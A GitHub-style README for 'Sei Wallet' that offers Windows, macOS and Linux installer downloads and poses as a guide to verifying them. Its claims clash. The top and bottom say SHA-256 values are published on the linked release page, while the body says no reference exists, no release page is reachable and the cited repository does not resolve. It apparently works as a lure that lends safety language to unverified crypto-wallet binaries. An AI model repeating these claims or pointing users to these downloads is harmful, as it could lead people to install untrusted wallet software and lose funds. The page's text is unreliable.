![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">How to verify a Sei Wallet download</h1>

<p align="center">Check the file you downloaded against the published SHA-256 before you run it.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Verification is three checks, in this order: you got the file from the operator's own domain, the file is a real build rather than an empty or HTML file, and your operating system recognises the publisher when you first run it. A published reference to compare against would be a fourth check, and it is the one you cannot do yet - none is published, so anyone quoting one to you is quoting themselves.

That last sentence is the useful part. A reference only means something when it comes from the publisher through a channel separate from the download. An unpublished one is exactly the artefact a fake site supplies, which is why "here is what it should be, compare it" is a red flag rather than reassurance.

## What "verify" can honestly mean today

Three things are checkable without any help from the operator:

- **Provenance** - you started from the operator's own domain, not a search result, an ad or a message.
- **Plausibility of the artefact** - the download produced a file of a sensible size that runs, rather than a web page saved with an installer's name.
- **Publisher identity at run time** - your operating system shows who signed the build, or tells you it is unsigned.

One thing is not checkable: whether the bytes you received match the bytes the operator built. That requires a published value or a reproducible build, and neither is available. This is a gap in the evidence, not a verdict on the software.

## Check 1: the source, not the search result

Type the operator's domain yourself, or use a bookmark you created earlier. Search results, sponsored links and messages are all delivery mechanisms for the wrong file, and they are designed to look identical to the right one.

HTTPS tells you the connection to that domain is encrypted. It does not tell you that the domain belongs to the operator, and it certainly does not tell you the file is correct. A padlock is a property of the connection, not of the publisher.

## Check 2: is the file a real file?

A download that finishes instantly is the tell. Two failure shapes matter:

**A zero-byte file.** The transfer completed but nothing arrived. That is a broken artefact - a server or build problem, not evidence of malice - and running it is impossible because there is nothing to run. Delete it and try again later or from another platform build.

**A web page saved as an installer.** Some hijacked links return HTML with an installer's name. Your system may open it in a browser, or refuse it. If double-clicking opens a page rather than an installer dialog, you have the wrong artefact.

Either way the rule is the same: do not disable your operating system's protections to force something to run. A build that needs security switched off is not a build you should run.

## Check 3: does the publisher check out?

The operator states that Windows builds are code-signed and macOS builds are notarised under an Apple developer identity, and that Linux builds ship with a signed manifest. On the evidence available, those are claims: no signature, key or manifest could be retrieved to compare against, because there is no reachable release page.

What you can still do is read what your machine says. On Windows, the first run of a signed installer shows a publisher identity in the security dialog; an unsigned one shows an unknown publisher or a block. On macOS, Gatekeeper either opens the app or refuses it as coming from an unidentified developer.

An unsigned warning is a fact about the file, not proof of tampering - plenty of legitimate software ships unsigned. But a build that claims signing and arrives unsigned is a mismatch worth stopping over.

## Check 4: the step that is not available

To confirm integrity you need a reference published by the operator, obtained separately from the download, and a tool that computes the same thing locally. Neither end exists here: no release page, no published reference, and the repository the site cites does not resolve.

So the honest status of this check is **NO DATA**. Not "there is no verification", and not "the download is fine" - simply that the comparison cannot be made today. If someone offers to perform it for you, they are asking for trust rather than providing evidence.

## What a bad download looks like

- an installer whose size is implausibly small, or exactly zero;
- a file that opens a browser page instead of an installer;
- a publisher prompt naming an entity you did not expect;
- a request for your seed phrase at any point during installation - installation never needs it;
- a "support" agent who contacts you first, about anything;
- a page that instructs you to disable antivirus or Gatekeeper.

The seed-phrase variants deserve their own reading: [seed phrase safety and support scams](https://github.com/sei-chain/sei-wallet-help/blob/main/seed-phrase-scams-and-fake-support.md).

## After install: three checks that matter more than the download

**The version the app reports.** Compare it with what the site describes. They should agree; a wild disagreement means you have an old or substituted build.

**The address you see.** Confirm it is the account you expect before sending anything, in whichever form the wallet opens on. The two-form problem is in [which address form to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).

**A first small transaction.** Send a small amount, confirm it arrives and is spendable, then move the rest. This catches address mistakes that no amount of file checking would.

## What would turn check 4 into a real step

A reachable repository with releases, asset names and a published reference would make the comparison possible. A published signing identity would make check 3 assertive rather than conditional. A dated audit report would not verify a download at all, but it would change what the safety article can claim.

Until then, the advice stands: provenance, artefact sense, publisher prompt, small test. That is a complete answer to "how do I avoid a fake installer", even without the fourth check.

## Related reading

What the software is and who operates it: [an introduction to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md). What safety can and cannot be asserted about it: [what safety can be asserted](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md). If you are adding Sei to an existing EVM wallet instead of installing anything: [the MetaMask route](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md). If the reason you are installing is staking: [how to stake SEI](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md).

## Frequently asked questions

**Can I compare my file against a published reference?** No. None is published, which is why this article does not give you one.

**Can I verify the download with the source code?** Not at present: the repository the site names does not resolve, so there is nothing to build or compare.

**Should I turn off antivirus to install it?** No. Never for any wallet, on any platform.

**Is a zero-byte download dangerous?** It is broken rather than dangerous. It also is not the build you wanted; stop and retry rather than improvising.

**How do I know the site I am on is the right one?** You do not, from the page alone. Start from a domain you typed or bookmarked, and treat unsolicited links as hostile by default.

**Do I need to verify again after an update?** Yes, in the same way. An update is a new file from the same source, and the same three checks apply.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Seed phrase safety and the support scams around Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/seed-phrase-scams-and-fake-support.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
